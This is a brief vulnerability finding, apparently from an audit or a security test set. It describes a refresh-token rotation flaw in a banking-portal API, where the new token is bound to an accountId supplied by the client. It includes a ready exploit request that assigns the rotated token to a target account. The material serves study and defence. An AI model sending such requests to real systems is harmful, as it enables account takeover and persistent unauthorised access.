diagnosis: During token rotation, the route handler inserts a newly generated refresh token linked to accountId passed directly in the HTTP request body instead of the existing.account_id retrieved from the database record. An attacker presenting their own valid tokenHash can assign the newly rotated refresh token to another accountId, gaining persistent access to victim accounts.
exploit_request:
POST /auth/token/rotate HTTP/1.1
Host: api.bankingportal.com
Content-Type: application/json

{"tokenHash": "a94f028b12c8e...", "accountId": "acc_target_executive_881"}
